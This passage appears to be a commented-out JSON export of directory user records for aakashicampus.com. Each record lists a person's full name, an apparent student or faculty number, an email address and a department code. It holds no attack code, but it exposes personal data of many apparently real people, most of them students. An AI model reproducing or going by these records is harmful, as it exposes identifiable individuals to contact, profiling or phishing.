#       "id": "03487f19-4133-412e-a187-14f4674702bd",
#       "displayName": "Avaneesh S Kulkarni (00014609630)",
#       "userPrincipalName": "00014609630@aakashicampus.com",
#       "department": "WF064",
#       "userType": "Member"
#     },
#     {
#       "id": "ecab8b58-9dd2-49ce-a948-e9f8901f17d7",
#       "displayName": "Ayush Sinha(00014591589)",
#       "userPrincipalName": "00014591589@aakashicampus.com",
#       "department": "WF064-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "5aede17a-8f8c-416e-83d8-fc69bb59fcc9",
#       "displayName": "B Arnav Varma (00013845662)",
#       "userPrincipalName": "00013845662@aakashicampus.com",
#       "department": "CC-064",
#       "userType": "Member"
#     },
#     {
#       "id": "67113046-f592-4e67-81be-6dc7e32cd4ef",
#       "displayName": "Bhaargavi SS(00012805140)",
#       "userPrincipalName": "00012805140@aakashicampus.com",
#       "department": "TN656-2526",
#       "userType": "Member"
#     },
#     {
#       "id": "4a1a7143-4e37-4e70-8d00-1f859e36f680",
#       "displayName": "Bhargav K (00014442842)",
#       "userPrincipalName": "00014442842@aakashicampus.com",
#       "department": "TN656",
#       "userType": "Member"
#     },
#     {
#       "id": "1d01d18d-f581-4856-ac65-a8aae4139e12",
#       "displayName": "Bhavana S(00013432444)",
#       "userPrincipalName": "00013432444@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "c96bd03c-bc24-48de-a18e-e54971abc95b",
#       "displayName": "Bhoomika K S(00009684735)",
#       "userPrincipalName": "00009684735@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "7a7ad837-9a8d-4ce7-ad52-439b16fee746",
#       "displayName": "Chaithanya RS(00014597407)",
#       "userPrincipalName": "00014597407@aakashicampus.com",
#       "department": "BI040-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "222ae305-d6be-437d-8687-f8e2d2d759ea",
#       "displayName": "Chinmai Rajasekhar (00014191225)",
#       "userPrincipalName": "00014191225@aakashicampus.com",
#       "department": "WF064",
#       "userType": "Member"
#     },
#     {
#       "id": "f7de8eb4-2138-4503-89b0-650602890c17",
#       "displayName": "Chinmai V(00014642850)",
#       "userPrincipalName": "00014642850@aakashicampus.com",
#       "department": "TN656-2526",
#       "userType": "Member"
#     },
#     {
#       "id": "b5f87ed3-1dc9-4f2e-8c88-6d5714612933",
#       "displayName": "CHINMAY M(00008564750)",
#       "userPrincipalName": "00008564750@aakashicampus.com",
#       "department": "WF064-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "232bca89-20ef-4f4a-a5e6-a5fbc30a2fa8",
#       "displayName": "Daksh Pramod(00014585638)",
#       "userPrincipalName": "00014585638@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "59df927c-b58c-4668-9573-b3d751d5eb76",
#       "displayName": "Davin jace MA(00015036864)",
#       "userPrincipalName": "00015036864@aakashicampus.com",
#       "department": "TN656-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "3396ba40-e285-4722-9bcb-76919d4c49bb",
#       "displayName": "Deeksha C K(00014909117)",
#       "userPrincipalName": "00014909117@aakashicampus.com",
#       "department": "WF064-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "4ea95816-1dc0-4b5e-ae30-d8ebd73cbea0",
#       "displayName": "Deepesh R(00012593459)",
#       "userPrincipalName": "00012593459@aakashicampus.com",
#       "department": "BI040-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "e4dfc397-e346-4dec-9968-e4684e7dfc60",
#       "displayName": "Deetchitha BS(00006479550)",
#       "userPrincipalName": "00006479550@aakashicampus.com",
#       "department": "TN656",
#       "userType": "Member"
#     },
#     {
#       "id": "8b484fc1-c29e-414a-835b-4a1aedd182db",
#       "displayName": "Devi Hansika Bachu(00014517754)",
#       "userPrincipalName": "00014517754@aakashicampus.com",
#       "department": "WF064-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "0940f355-d9fa-44a9-93ab-91baf542efe9",
#       "displayName": "Dharnish A(00015119578)",
#       "userPrincipalName": "00015119578@aakashicampus.com",
#       "department": "TN656-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "813c0793-f6da-429c-a0b7-88d4d0c7dbc5",
#       "displayName": "DHARSHINI U(00012562226)",
#       "userPrincipalName": "00012562226@aakashicampus.com",
#       "department": "TN656-2425",
#       "userType": "Member"
#     },
#     {
#       "id": "7aed7555-5573-4a92-b2d9-f413b2cca065",
#       "displayName": "Dharun Prasath R(00015209248)",
#       "userPrincipalName": "00015209248@aakashicampus.com",
#       "department": "TN656-2526",
#       "userType": "Member"
#     },
#     {
#       "id": "48b5a32e-3b68-47ba-a938-05929665eb3e",
#       "displayName": "Dheeraj kumar(00015209223)",
#       "userPrincipalName": "00015209223@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "059fa305-7808-44a9-ac13-298bd65d4e64",
#       "displayName": "Dhivya Bharathi(00012579444)",
#       "userPrincipalName": "00012579444@aakashicampus.com",
#       "department": "TN656-2425",
#       "userType": "Member"
#     },
#     {
#       "id": "d272aa7c-ac17-4e25-823a-ba05d1b7ddd0",
#       "displayName": "Dhrupad kumar K.S(00010777824)",
#       "userPrincipalName": "00010777824@aakashicampus.com",
#       "department": "TN656-2325",
#       "userType": "Member"
#     },
#     {
#       "id": "75381ad2-e307-42a7-81af-7ca5f2160e85",
#       "displayName": "Dhruva Chowdari(00005292282)",
#       "userPrincipalName": "00005292282@aakashicampus.com",
#       "department": "WF064-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "d29932e9-52a7-41b3-aa4d-248097dc56a0",
#       "displayName": "DHRUVA HEGDE(00011843533)",
#       "userPrincipalName": "00011843533@aakashicampus.com",
#       "department": "WF064-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "b090e629-7515-4b10-8443-0451c71d0442",
#       "displayName": "dhyanaganesh thawari(00014616029)",
#       "userPrincipalName": "00014616029@aakashicampus.com",
#       "department": "TN656-2526",
#       "userType": "Member"
#     },
#     {
#       "id": "95487d9e-74b7-451f-b52b-141e8ba1ecad",
#       "displayName": "Edp Bannerghatta (BH410)",
#       "userPrincipalName": "bh410@aakashicampus.com",
#       "department": "BH410",
#       "userType": "Member"
#     },
#     {
#       "id": "f036b34e-8265-44ef-886b-ca5eff084620",
#       "displayName": "Edp Hosur (656TN)",
#       "userPrincipalName": "TN656@aakashicampus.com",
#       "department": "656TN",
#       "userType": "Member"
#     },
#     {
#       "id": "bfbd83f3-4860-41ef-8327-0add4f98589e",
#       "displayName": "Edp Hsrlayout (083BH)",
#       "userPrincipalName": "edp.hsrlayout@aakashicampus.com",
#       "department": "083BH",
#       "userType": "Member"
#     },
#     {
#       "id": "f560a940-dd81-4403-8905-d5e332251ad1",
#       "displayName": "Edp Hsrlayout (BH083)",
#       "userPrincipalName": "bh083@aakashicampus.com",
#       "department": "BH083",
#       "userType": "Member"
#     },
#     {
#       "id": "6748584c-0da6-4448-ab25-4b90764408d7",
#       "displayName": "Edp Inagar (040BI)",
#       "userPrincipalName": "edp.inagar@aakashicampus.com",
#       "department": "040BI",
#       "userType": "Member"
#     },
#     {
#       "id": "eb37bbf2-f217-4a69-b43e-98d1ce166afb",
#       "displayName": "Edp Inagar (BI040)",
#       "userPrincipalName": "bi040@aakashicampus.com",
#       "department": "BI040",
#       "userType": "Member"
#     },
#     {
#       "id": "6bf59cbb-c298-4f86-a44f-fbf8a3862bc3",
#       "displayName": "Edp Jayanagar (BJ042)",
#       "userPrincipalName": "bj042@aakashicampus.com",
#       "department": "BJ042",
#       "userType": "Member"
#     },
#     {
#       "id": "47ad55ff-1e09-4c4b-ba11-ece066b6b2b0",
#       "displayName": "Edp Whitefield (064WF)",
#       "userPrincipalName": "edp.whitefield@aakashicampus.com",
#       "department": "064WF",
#       "userType": "Member"
#     },
#     {
#       "id": "c469ddab-2112-4b59-b811-9da36b069673",
#       "displayName": "Edp Whitefield (WF064)",
#       "userPrincipalName": "wf064@aakashicampus.com",
#       "department": "WF064",
#       "userType": "Member"
#     },
#     {
#       "id": "71c92f39-1760-4224-adb3-f215a35e872e",
#       "displayName": "GAGAN SAMANTA(00008197333)",
#       "userPrincipalName": "00008197333@aakashicampus.com",
#       "department": "BI040",
#       "userType": "Member"
#     },
#     {
#       "id": "8a324483-7e9f-4e28-9730-e5a5c697914a",
#       "displayName": "Gagana Ck (00013786131)",
#       "userPrincipalName": "00013786131@aakashicampus.com",
#       "department": "WF064",
#       "userType": "Member"
#     },
#     {
#       "id": "eefe280f-01c7-4910-8d18-effd2ee9be39",
#       "displayName": "Garvit Bhatt (FM14148)",
#       "userPrincipalName": "garvitbhatt.fac@aakashicampus.com",
#       "department": "CC-046",
#       "userType": "Member"
#     },
#     {
#       "id": "e91ee95e-c9ee-4a0e-a528-88d11ce9078a",
#       "displayName": "Gayathri .G(00012907135)",
#       "userPrincipalName": "00012907135@aakashicampus.com",
#       "department": "TN656-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "9d3bcb5f-fa74-44c4-9016-bd1f3ace6fd7",
#       "displayName": "GOKUL RAMESH(00009039409)",
#       "userPrincipalName": "00009039409@aakashicampus.com",
#       "department": "TN656-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "6a7b14d3-b4a1-4432-8535-632ebd6f3d0d",
#       "displayName": "Hanshika(00014838668)",
#       "userPrincipalName": "00014838668@aakashicampus.com",
#       "department": "WF064-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "3dc5a193-88f0-4437-b30c-3c936515b2b4",
#       "displayName": "Hari prasad(00007428089)",
#       "userPrincipalName": "00007428089@aakashicampus.com",
#       "department": "TN656-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "3a5a348e-8c92-450a-94de-46a9a69008db",
#       "displayName": "Hariharan M(00012405740)",
#       "userPrincipalName": "00012405740@aakashicampus.com",
#       "department": "TN656-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "81b48fc8-699e-4e40-aced-e9125801368d",
#       "displayName": "Harimukesh P(00012585850)",
#       "userPrincipalName": "00012585850@aakashicampus.com",
#       "department": "TN656-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "64b2d97c-53ff-4b6f-afb7-34ccb416f682",
#       "displayName": "Harinisha S (00014373741)",
#       "userPrincipalName": "00014373741@aakashicampus.com",
#       "department": "CC-656",
#       "userType": "Member"
#     },
#     {
#       "id": "1856c302-f974-46d3-ad2e-7c1d3131c80b",
#       "displayName": "Harish B M (FZ05636)",
#       "userPrincipalName": "harishbm.fac@aakashicampus.com",
#       "department": "CC-042",
#       "userType": "Member"
#     },
#     {
#       "id": "5ba3a38a-c240-4619-88fd-6dfce5d98272",
#       "displayName": "Harsha Jha(00013639474)",
#       "userPrincipalName": "00013639474@aakashicampus.com",
#       "department": "BI040-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "d53e29ab-dc45-4db7-9bf2-e4a879e4cc12",
#       "displayName": "Harshil Agrawal (00013808090)",
#       "userPrincipalName": "00013808090@aakashicampus.com",
#       "department": "BH410",
#       "userType": "Member"
#     },
#     {
#       "id": "81928f56-685d-4540-aecc-9469c4d917d1",
#       "displayName": "Hemaprabha S K(00006007406)",
#       "userPrincipalName": "00006007406@aakashicampus.com",
#       "department": "TN656-2526",
#       "userType": "Member"
#     },
#     {
#       "id": "190888ee-9b54-4564-9553-c8684b08d65b",
#       "displayName": "Himani Panda(00011809534)",
#       "userPrincipalName": "00011809534@aakashicampus.com",
#       "department": "BI040-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "9ba3eca2-8490-4e8f-b2b8-822107a654bf",
#       "displayName": "Ishaan N(00014589993)",
#       "userPrincipalName": "00014589993@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "c88d9db3-8125-4dd1-875e-df2866687a0d",
#       "displayName": "Jaigogul E v(00012438221)",
#       "userPrincipalName": "00012438221@aakashicampus.com",
#       "department": "TN656-2425",
#       "userType": "Member"
#     },
#     {
#       "id": "770d20f7-6af2-423f-a12d-36f7339b8965",
#       "displayName": "JAISHREE J V(00014755070)",
#       "userPrincipalName": "00014755070@aakashicampus.com",
#       "department": "TN656-2526",
#       "userType": "Member"
#     },
#     {
#       "id": "7398e132-96e3-4cf0-9795-1c6f2821fb0d",
#       "displayName": "Jeevitha V(00015291829)",
#       "userPrincipalName": "00015291829@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "b95420b6-ba7c-4312-81bc-1114b7e8818e",
#       "displayName": "Josh Kevin J(00007637827)",
#       "userPrincipalName": "00007637827@aakashicampus.com",
#       "department": "TN656",
#       "userType": "Member"
#     },
#     {
#       "id": "8ea81b22-79ab-4407-b9a3-9dabf6100dfa",
#       "displayName": "K Revanth Reddy (00014421627)",
#       "userPrincipalName": "00014421627@aakashicampus.com",
#       "department": "WF064",
#       "userType": "Member"
#     },
#     {
#       "id": "e4323d39-9509-47ec-b4b6-7ea325ed67ad",
#       "displayName": "Kamala kannan(00015076813)",
#       "userPrincipalName": "00015076813@aakashicampus.com",
#       "department": "BH083-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "282d7fdd-08a0-4f61-9da3-86bed82155c6",
#       "displayName": "Kanishk Mundhra(00012061780)",
#       "userPrincipalName": "00012061780@aakashicampus.com",
#       "department": "BI040-2425",
#       "userType": "Member"
#     },
#     {
#       "id": "07dd1aad-99e7-48eb-a1df-a553bc6f0e6c",
#       "displayName": "Kartheesan S N (00014724982)",
#       "userPrincipalName": "00014724982@aakashicampus.com",
#       "department": "CC-656",
#       "userType": "Member"
#     },
#     {
#       "id": "eb94918f-097b-4fc1-a891-1d99143532b8",
#       "displayName": "Kartiktiwari (00014601572)",
#       "userPrincipalName": "00014601572@aakashicampus.com",
#       "department": "WF064",
#       "userType": "Member"
#     },
#     {
#       "id": "86936d80-48bf-4b2a-9aac-1c199d6fefcf",
#       "displayName": "KAUSIK PALANIVEL(00014994605)",
#       "userPrincipalName": "00014994605@aakashicampus.com",
#       "department": "TN656-2526",
#       "userType": "Member"
#     },
#     {
#       "id": "c53f5a51-5583-4c52-8a49-b1ead1693d7e",
#       "displayName": "Kaustubh Kashyap(00009205880)",
#       "userPrincipalName": "00009205880@aakashicampus.com",
#       "department": "WF064-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "af7960d8-4f53-4867-bc73-b6f292f96b46",
#       "displayName": "Keerthana S(00014933253)",
#       "userPrincipalName": "00014933253@aakashicampus.com",
#       "department": "KA654-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "d0b8ba7c-e968-4a59-9000-a45c0c294029",
#       "displayName": "Keerthivasan P(00010177316)",
#       "userPrincipalName": "00010177316@aakashicampus.com",
#       "department": "TN656-2324",
#       "userType": "Member"
#     },
#     {
#       "id": "22de4e40-b31b-4593-8b07-d6eda6301103",
#       "displayName": "Keshav .( 00010209346 )",
#       "userPrincipalName": "00010209346@aakashicampus.com",
#       "department": "AESL1",
#       "userType": "Member"
#     },
#     {
#       "id": "9fdea946-c830-4bf6-ab38-328f980f4e42",
#       "displayName": "Kota Venkata Subba Rao (FM09120)",
#       "userPrincipalName": "kotavenkatasubbarao.fac@aakashicampus.com",
#       "department": "CC-442",
#       "userType": "Member"
#     },
#     {
#       "id": "6cb75f82-09d3-47c5-85b1-cc9200496f09",
#       "displayName": "Laasya Ilavaram (00014331596)",
#       "userPrincipalName": "00014331596@aakashicampus.com",
#       "department": "BH410",
#       "userType": "Member"
#     },
#     {
#       "id": "0097090d-e20d-45bb-88c9-baf0678f7b16",
#       "displayName": "LAKSHITHA ASHOK KUMAR(00015093057)",
#       "userPrincipalName": "00015093057@aakashicampus.com",
#       "department": "TN656-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "df9cf708-63d9-4768-bf21-26b972bef641",
#       "displayName": "Laukyashree U(00014614238)",
#       "userPrincipalName": "00014614238@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "b112db3c-b145-488e-8f22-a178d8bcc654",
#       "displayName": "Laura Sulkunte(00015300259)",
#       "userPrincipalName": "00015300259@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "e623d858-9cdf-48a4-b9a8-ae67545a556e",
#       "displayName": "Leenashilpashini S (00012591988)",
#       "userPrincipalName": "00012591988@aakashicampus.com",
#       "department": "TN656-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "8f6eee1b-c454-460a-b3ca-3343e849f826",
#       "displayName": "Lovisha Johri (00014331563)",
#       "userPrincipalName": "00014331563@aakashicampus.com",
#       "department": "BH410",
#       "userType": "Member"
#     },
#     {
#       "id": "9de02bfe-2d00-4e9a-a75d-900c0aadab9d",
#       "displayName": "Maalavika L(00008573884)",
#       "userPrincipalName": "00008573884@aakashicampus.com",
#       "department": "BH410-2425",
#       "userType": "Member"
#     },
#     {
#       "id": "d8493ca2-2d58-4fb1-8110-9c80b749568d",
#       "displayName": "Madimi Aashritha (00014438870)",
#       "userPrincipalName": "00014438870@aakashicampus.com",
#       "department": "WF064",
#       "userType": "Member"
#     },
#     {
#       "id": "2f6de7e0-ca1b-4993-90ad-f0a7d6d8ab14",
#       "displayName": "Mahalakshmi S(00015255949)",
#       "userPrincipalName": "00015255949@aakashicampus.com",
#       "department": "TN656-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "3bc30811-1a24-45f3-a50c-c3640638bec2",
#       "displayName": "Mahasakthi (00013625081)",
#       "userPrincipalName": "00013625081@aakashicampus.com",
#       "department": "CC-656",
#       "userType": "Member"
#     },
#     {
#       "id": "276d095b-054b-49cc-8f09-0ce68dfccfbc",
#       "displayName": "Manikandan K S(00013918299)",
#       "userPrincipalName": "00013918299@aakashicampus.com",
#       "department": "TN656-2526",
#       "userType": "Member"
#     },
#     {
#       "id": "a1e09273-a629-4356-8683-c2a889c24ebc",
#       "displayName": "Manu Neeralagi( 00009448863 )",
#       "userPrincipalName": "00009448863@aakashicampus.com",
#       "department": "AESL1",
#       "userType": "Member"
#     },
#     {
#       "id": "09f96654-7ff4-4b25-a7f9-6f7a353c77b8",
#       "displayName": "Manyam Srivatsav (00009402136)",
#       "userPrincipalName": "00009402136@aakashicampus.com",
#       "department": "WF064",
#       "userType": "Member"
#     },
#     {
#       "id": "55ba8236-4f88-4db8-aca3-ab3d0789b6cf",
#       "displayName": "MARZOOQUAH FATHIMA(00014962697)",
#       "userPrincipalName": "00014962697@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "f7adf360-afcd-4238-a5e3-f3f3851717cd",
#       "displayName": "Mitra Muthukumar(00012141051)",
#       "userPrincipalName": "00012141051@aakashicampus.com",
#       "department": "WF064-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "c94b05d2-9cbe-476d-a1ae-7bd7ee428698",
#       "displayName": "Mugilan Vu (00013872888)",
#       "userPrincipalName": "00013872888@aakashicampus.com",
#       "department": "CC-656",
#       "userType": "Member"
#     },
#     {
#       "id": "8f358235-19b1-496b-adb2-e46fe84c1ac4",
#       "displayName": "MuhammedNaumaan Naumaan(00014229750)",
#       "userPrincipalName": "00014229750@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "c9b0289d-4e2d-44c3-8617-95efe04cdb73",
#       "displayName": "Mukilan V( 00010506490 )",
#       "userPrincipalName": "00010506490@aakashicampus.com",
#       "department": "AESL1",
#       "userType": "Member"
#     },
#     {
#       "id": "dc9ae15d-6b88-44a5-9f28-a145ce25c06e",
#       "displayName": "Muppala Yashwanth Chowdary (FC08240)",
#       "userPrincipalName": "muppalayashwanthchowdary.fac@aakashicampus.com",
#       "department": "32JKH",
#       "userType": "Member"
#     },
#     {
#       "id": "605437ec-fa54-4c00-87cd-74c5bcbdd89c",
#       "displayName": "NAMIYSH VIGNESHWAR RM(00012602641)",
#       "userPrincipalName": "00012602641@aakashicampus.com",
#       "department": "TN656-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "6633a6e0-09e6-4254-a131-d48908cdaaa2",
#       "displayName": "ND rupesha(00007406713)",
#       "userPrincipalName": "00007406713@aakashicampus.com",
#       "department": "BI040",
#       "userType": "Member"
#     },
#     {
#       "id": "df080678-86af-44e0-ae78-f1fea7b77073",
#       "displayName": "Neha Arora(00014585383)",
#       "userPrincipalName": "00014585383@aakashicampus.com",
#       "department": "WF064-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "5a2dbc80-9c50-42da-bef2-bb56d09b6823",
#       "displayName": "NIDHEESH LAMBA.( 00010286269 )",
#       "userPrincipalName": "00010286269@aakashicampus.com",
#       "department": "AESL1",
#       "userType": "Member"
#     },
#     {
#       "id": "d0d3e50c-7e38-4bee-9b06-80dbde3b9263",
#       "displayName": "Nidhi S(00014640597)",
#       "userPrincipalName": "00014640597@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "9831871e-2dae-4c9b-855a-64844195323f",
#       "displayName": "Nimmala Nishanth(00012725558)",
#       "userPrincipalName": "00012725558@aakashicampus.com",
#       "department": "WF064-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "7bd402fc-ac9f-431e-86c7-1fb6d75b51f2",
#       "displayName": "Nithyashree(00004995857)",
#       "userPrincipalName": "00004995857@aakashicampus.com",
#       "department": "BH410-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "881dd179-1c9f-47a5-81ea-c829345a2d5d",
#       "displayName": "Niyati Sajan(00012604823)",
#       "userPrincipalName": "00012604823@aakashicampus.com",
#       "department": "BH083-2425",
#       "userType": "Member"
#     },
#     {
#       "id": "8b4c1dfb-3b64-499b-9879-eaf4f248004b",
#       "displayName": "Parag Giridhar Davangeri (FZ07122)",
#       "userPrincipalName": "paraggiridhardavangeri.fac@aakashicampus.com",
#       "department": "CC-023",
#       "userType": "Member"
#     },
#     {
#       "id": "c3c6ec79-ae27-41b8-a5b0-9fecb80719ff",
#       "displayName": "Paramjot Singh (00014331524)",
#       "userPrincipalName": "00014331524@aakashicampus.com",
#       "department": "CC-410",
#       "userType": "Member"
#     },
#     {
#       "id": "8c996e49-9ba3-4a57-a124-80505ac0ba55",
#       "displayName": "Paras phadke(00007944958)",
#       "userPrincipalName": "00007944958@aakashicampus.com",
#       "department": "KA654-2425",
#       "userType": "Member"
#     },
#     {
#       "id": "c5777e12-eec1-4caf-bc05-22a30f2aaf00",
#       "displayName": "Pasupula Narender (FC07807)",
#       "userPrincipalName": "pnarender.fac@aakashicampus.com",
#       "department": "CC-040",
#       "userType": "Member"
#     },
#     {
#       "id": "38c1bf80-b8c9-484d-8dcb-36f80a0c840a",
#       "displayName": "Pragya Sharma(00015303685)",
#       "userPrincipalName": "00015303685@aakashicampus.com",
#       "department": "BH410-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "b8d3ce5f-df0b-4420-bbb1-22ba6c245964",
#       "displayName": "Prajwal S R(00006789835)",
#       "userPrincipalName": "00006789835@aakashicampus.com",
#       "department": "WF064-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "aeb5c223-e5f2-4f35-816e-8fa5cd9e2d02",
#       "displayName": "Pranav R(00012241452)",
#       "userPrincipalName": "00012241452@aakashicampus.com",
#       "department": "BH083-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "a53683af-52d9-4364-8cd8-06ba350efd0d",
#       "displayName": "Pratik Nitin Mohorikar(00013593369)",
#       "userPrincipalName": "00013593369@aakashicampus.com",
#       "department": "BI040-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "9d28aa7c-1b79-49d4-81de-e97df6dceb39",
#       "displayName": "Prithvi bhat(00014409340)",
#       "userPrincipalName": "00014409340@aakashicampus.com",
#       "department": "BH083-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "b29fe3f6-8006-473b-bd9b-5f9540afc0e1",
#       "displayName": "priyansh soni(00014932307)",
#       "userPrincipalName": "00014932307@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "d5b88a75-adef-45db-ab59-787818944ecb",
#       "displayName": "Purvi Ambastha(00008450886)",
#       "userPrincipalName": "00008450886@aakashicampus.com",
#       "department": "BH410-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "8d45cab9-4bdc-4387-bcaa-7831fb2db06a",
#       "displayName": "RAHUL PRASATH A(00006386926)",
#       "userPrincipalName": "00006386926@aakashicampus.com",
#       "department": "TN656",
#       "userType": "Member"
#     },
#     {
#       "id": "28544e26-4c79-44a5-b309-5bcacb6ecb0e",
#       "displayName": "Rajarajeshwari R(00012403959)",
#       "userPrincipalName": "00012403959@aakashicampus.com",
#       "department": "TN656-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "6e2b7ee6-5582-4d71-a4d2-9edc15de02e3",
#       "displayName": "Rajeshkumar Karukuri (FB02109)",
#       "userPrincipalName": "rajeshkumarkarukuri.fac@aakashicampus.com",
#       "department": "CC-050",
#       "userType": "Member"
#     },
#     {
#       "id": "19164adc-70c1-44b1-a4a9-a2338ba14cb1",
#       "displayName": "Raksha V(00014592174)",
#       "userPrincipalName": "00014592174@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "ae184ec2-f51b-4003-b776-61f973929970",
#       "displayName": "Rakshan Sahu(00013125826)",
#       "userPrincipalName": "00013125826@aakashicampus.com",
#       "department": "BH410-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "bdda398c-b46b-4414-89a5-20b313fe3ef9",
#       "displayName": "Rakshith D N(00014165628)",
#       "userPrincipalName": "00014165628@aakashicampus.com",
#       "department": "BH410-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "f52981e7-38e8-4e62-9f37-ae3d2b4bb468",
#       "displayName": "Ram Babu Vemula (FM02381)",
#       "userPrincipalName": "rambabuvemula.fac@aakashicampus.com",
#       "department": "CC-042",
#       "userType": "Member"
#     },
#     {
#       "id": "2faaaa9b-b8c1-451c-899e-313acc9b83fe",
#       "displayName": "Rangesh(00013605834)",
#       "userPrincipalName": "00013605834@aakashicampus.com",
#       "department": "TN656-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "b38a8e40-2314-45f3-9894-f0b9e7616d6d",
#       "displayName": "Rishabh Gupta (FM10361)",
#       "userPrincipalName": "rishabhgupta.fac@aakashicampus.com",
#       "department": "CC-650",
#       "userType": "Member"
#     },
#     {
#       "id": "7a7c2655-2a48-4c19-958f-d5da31b9ee68",
#       "displayName": "Risith Rahul(00013226657)",
#       "userPrincipalName": "00013226657@aakashicampus.com",
#       "department": "TN656-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "e928ec4d-a6a8-42f1-9588-545768415b76",
#       "displayName": "Ritheeshwar R (00013949635)",
#       "userPrincipalName": "00013949635@aakashicampus.com",
#       "department": "CC-656",
#       "userType": "Member"
#     },
#     {
#       "id": "88dc37ea-fb8b-47e0-8bd4-545b68db6c57",
#       "displayName": "Rohit bijoY(00014605954)",
#       "userPrincipalName": "00014605954@aakashicampus.com",
#       "department": "TN656-2526",
#       "userType": "Member"
#     },
#     {
#       "id": "0614d524-fe05-4d6e-86f6-532853a21b1f",
#       "displayName": "Rohit S (00014586527)",
#       "userPrincipalName": "00014586527@aakashicampus.com",
#       "department": "CC-656",
#       "userType": "Member"
#     },
#     {
#       "id": "490f168a-c393-47ba-964a-12c3191d38de",
#       "displayName": "S Dayanitha(00011222108)",
#       "userPrincipalName": "00011222108@aakashicampus.com",
#       "department": "BH410-2425",
#       "userType": "Member"
#     },
#     {
#       "id": "408cd212-ccf4-4ce7-9347-10d3215972f9",
#       "displayName": "S R Aarabhi (00014612217)",
#       "userPrincipalName": "00014612217@aakashicampus.com",
#       "department": "WF064",
#       "userType": "Member"
#     },
#     {
#       "id": "55f62c47-ba17-42d0-b09f-cd7d405d346f",
#       "displayName": "SA Kavin(00015198132)",
#       "userPrincipalName": "00015198132@aakashicampus.com",
#       "department": "WF064-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "ac566173-fabb-4c61-a064-8f5b3609d5f2",
#       "displayName": "Saanvi Jha(00012595421)",
#       "userPrincipalName": "00012595421@aakashicampus.com",
#       "department": "MH651-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "155f205f-d507-45e6-93ec-2341e0628f52",
#       "displayName": "Sagar N(00005574512)",
#       "userPrincipalName": "00005574512@aakashicampus.com",
#       "department": "BH410-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "69ac6591-4790-4964-9454-643d5a602621",
#       "displayName": "Sagar R(00012616860)",
#       "userPrincipalName": "00012616860@aakashicampus.com",
#       "department": "TN656-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "e21f0c10-8fc4-46c0-b8ea-d924f3edc5c3",
#       "displayName": "Sai Haneesh(00014398876)",
#       "userPrincipalName": "00014398876@aakashicampus.com",
#       "department": "WF064-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "a7feebf5-ffcc-4e0f-b50a-0ab727ed67be",
#       "displayName": "Saidharshan S(00014592585)",
#       "userPrincipalName": "00014592585@aakashicampus.com",
#       "department": "TN656-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "ebe85286-73fc-4730-8997-7201b46d1554",
#       "displayName": "SaiVennela Sri V(00014036849)",
#       "userPrincipalName": "00014036849@aakashicampus.com",
#       "department": "WF064-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "30ba105e-ad47-4f77-9e42-89184cda0447",
#       "displayName": "Samanvitha Korada (00014591422)",
#       "userPrincipalName": "00014591422@aakashicampus.com",
#       "department": "WF064",
